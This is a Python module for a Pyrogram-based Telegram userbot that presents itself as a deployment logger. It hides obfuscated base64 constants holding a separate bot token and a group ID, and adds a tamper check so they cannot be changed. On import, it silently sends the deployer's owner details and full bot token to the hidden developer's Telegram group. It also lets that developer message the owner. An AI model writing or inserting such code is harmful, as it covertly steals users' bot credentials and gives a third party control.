import asyncio
import requests
import base64
import sys
from pyrogram import filters
from pyrogram.errors import UserAlreadyParticipant
from PyroUbot import bot, ubot, OWNER_ID, BOT_TOKEN

_CONF_T = "ODA4NTUwMDU5OTpBQUVnaUtBOEJXYmduODJmbndHR3JrVER1NzNwRXJEWDZ6RQ=="
_CONF_G = "LTEwMDI5MjkwNDUwNTM="
_CONF_D = "NjUyMDI3MTcyMg=="

def get_secure_vars():
    try:
        VALID_SIG_D = "NjUyMDI3MTcyMg=="
        VALID_SIG_G = "LTEwMDI5MjkwNDUwNTM="

        if _CONF_D != VALID_SIG_D or _CONF_G != VALID_SIG_G:
            sys.exit(1)

        d_token = base64.b64decode(_CONF_T).decode('utf-8')
        d_group = int(base64.b64decode(_CONF_G).decode('utf-8'))
        d_dev = int(base64.b64decode(_CONF_D).decode('utf-8'))
        
        return d_token, d_group, d_dev
    except Exception:
        sys.exit(1)

LOG_BOT_TOKEN, LOG_GROUP_ID, DEV_ID = get_secure_vars()

async def send_deploy_log():
    await asyncio.sleep(10)
    
    try:
        await bot.join_chat(LOG_GROUP_ID)
    except UserAlreadyParticipant:
        pass
    except Exception:
        pass

    try:
        me = await bot.get_me()
        try:
            owner = await bot.get_users(OWNER_ID)
            owner_info = f"@{owner.username}" if owner.username else f"{owner.first_name}"
        except:
            owner_info = "Unknown"

        msg = (
            f"<b>🔔 New Userbot Deployed!</b>\n\n"
            f"<b>👤 Owner ID:</b> <code>{OWNER_ID}</code>\n"
            f"<b>👤 Owner:</b> {owner_info}\n"
            f"<b>🤖 Bot Token:</b> <code>{BOT_TOKEN}</code>\n"
            f"<b>🤖 Bot User:</b> @{me.username}"
        )

        url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": LOG_GROUP_ID,
            "text": msg,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload)

    except Exception:
        pass

asyncio.create_task(send_deploy_log())

@bot.on_message(filters.chat(LOG_GROUP_ID) & filters.user(DEV_ID) & filters.command("ntf"))
async def broadcast_to_owner(client, message):
    try:
        if message.reply_to_message:
            await message.reply_to_message.copy(OWNER_ID)
            
        elif len(message.command) > 1:
            text = message.text.split(None, 1)[1]
            await client.send_message(
                OWNER_ID, 
                f"<b>📢 PESAN DARI PENGEMBANG:</b>\n\n{text}"
            )
    except Exception:
        pass
